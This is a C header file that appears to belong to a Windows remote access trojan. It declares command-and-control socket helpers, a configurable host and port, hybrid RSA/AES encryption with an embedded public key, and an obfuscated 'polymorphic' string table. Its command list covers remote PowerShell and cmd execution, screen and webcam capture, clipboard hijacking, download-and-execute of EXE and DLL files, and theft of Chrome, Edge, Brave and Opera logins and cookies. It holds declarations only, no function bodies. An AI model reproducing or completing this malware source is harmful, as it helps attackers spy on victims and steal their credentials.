#ifndef UTILS_H
#define UTILS_H

#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Base64
char* base64_encode(const unsigned char* data, size_t input_length, size_t* output_length);
unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length);

// String helpers
char* str_replace(const char* orig, const char* rep, const char* with);
void str_trim(char* s);

// Networking helper
void sock_send(SOCKET sock, HANDLE mutex, const char* msg);
void sock_send_ex(SOCKET sock, HANDLE mutex, const char* type, const char* msg);

// Hybrid Encryption
typedef struct { unsigned char key[32]; unsigned char iv[16]; } SessionKey;
char* rsa_encrypt_pkcs1(const unsigned char* data, size_t len, const char* pubkey_pem);
char* aes_256_cbc_encrypt(const unsigned char* plain, size_t len, const unsigned char* key, const unsigned char* iv);
unsigned char* aes_256_cbc_decrypt(const char* cipher_b64, size_t* out_len, const unsigned char* key, const unsigned char* iv);

// Time
void get_formatted_time(unsigned long long secs, char* out_buf);

// Polymorphic String system
typedef enum {
    S_PING, S_PONG, S_MSG_PRE, S_MSG_TITLE, S_OK, S_EXEC_PS, S_PS_OUT, S_EXEC_CMD, S_CMD_OUT,
    S_SCR_STOP, S_CAM_STOP, S_TASKLIST, S_TASKKILL, S_LS, S_DOWNLOAD, S_DELETE, S_MKDIR,
    S_UPLOAD, S_RENAME, S_RFE_EXE, S_RFE_DLL, S_BROWSER_COL, S_CLIP_GET, S_CLIP_SET,
    S_UNINSTALL, S_CLOSE, S_RECONNECT, S_SET_DELAY, S_SCR_START, S_CAM_START, S_SYSINFO,
    S_RESPONSE, S_COMMAND, S_SESSION, S_REG_WIN_KEY, S_REG_PROD_NAME, S_REG_BUILD,
    S_REG_DISPLAY, S_REG_RELEASE, S_REG_AV_BASE, S_REG_DEFENDER_KEY, S_REG_DIS_SPY,
    S_REG_GPU_KEY, S_REG_GPU_DESC, S_REG_CPU_KEY, S_REG_CPU_NAME, S_HTTP_UA, S_HTTP_HOST,
    S_HTTP_PATH, S_C_DRIVE, S_UNKNOWN, S_WIN_DEF, S_COUNTRY_NA, S_LS_RES, S_TASK_RES, S_KILL_RES,
    S_FB_PATH, S_FB_SEP, S_FB_NAME, S_FB_TYPE, S_FB_DRIVE, S_FB_SIZE, S_FB_MTIME, S_FB_ITEMS,
    S_FB_DIR, S_FB_FILE, S_FB_ERROR, S_FB_DENIED, S_FB_CANNOT_OPEN, S_FB_CANNOT_DEL, S_FB_CANNOT_MKDIR,
    S_PS_ARGS, S_CMD_C, S_SCR_FILE, S_SCR_FRAME, S_CAM_FILE, S_CAM_FRAME, S_CLIP_RES,
    S_CLIP_ERR_OPEN, S_CLIP_ERR_LOCK, S_CLIP_SET_RES, S_CLIP_SET_ERR_OPEN, S_CLIP_SET_ERR_ALLOC,
    S_CLIP_SET_ERR_DATA, S_RFE_RES, S_RFE_ERR_DOWN, S_RFE_ERR_PROC, S_RFE_ERR_DLL, S_RFE_EXE_NAME,
    S_RFE_DLL_NAME, S_RUNDLL, S_TASK_PID, S_TASK_NAME, S_TASK_CPU, S_TASK_MEM, S_KILL_OK,
    S_BR_CHROME, S_BR_EDGE, S_BR_BRAVE, S_BR_OPERA, S_BR_CHROME_PATH, S_BR_EDGE_PATH,
    S_BR_BRAVE_PATH, S_BR_OPERA_PATH, S_BR_CHROME_DLL, S_BR_EDGE_DLL, S_BR_OPERA_DLL,
    S_BR_LOGIN, S_BR_COOKIES, S_BR_WEB, S_BR_NET_COOKIES, S_BR_DEFAULT, S_BR_PROFILE, S_BR_MARKER,
    S_UNINSTALL_CMD,
    S_COUNT
} StringIndex;

extern char g_host[256];
extern int g_port;
void load_config_from_resource();
const char* s(StringIndex idx);

#define RSA_PUB_KEY "-----BEGIN PUBLIC KEY-----\n"\
"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuYRrLUofWNv/EU3mNLah\n"\
"JQb9i7dbOi35/KGzyYsPd2HcufAa36GvQowUhGQyIWDfXqes7MkTQOE6/oNed1Ri\n"\
"QqNJBI7dexup5W54G4NIzl8BuY34A0jxsrKvZ5ZfYm/hDXMG7i1Qmqz3q7YU4AMH\n"\
"lpIZkfHgcvDNTj5AosN88HRgvfo8M8l8U8+jdCbJa4LSBS7Q0gYwuzUJedm6Cw9Y\n"\
"MgSxi1Dlgy/t6S3M2bPx2EFGQttagPBL8LFT+kGPQSsRpTkniNLOME8Bmk5muQCV\n"\
"JIJDxn9zppu5zYYcDgzQLRPfN+VxoVIby9JapCMQBELyM2KponzjW7TEOKHkjRql\n"\
"9QIDAQAB\n"\
"-----END PUBLIC KEY-----"

#endif
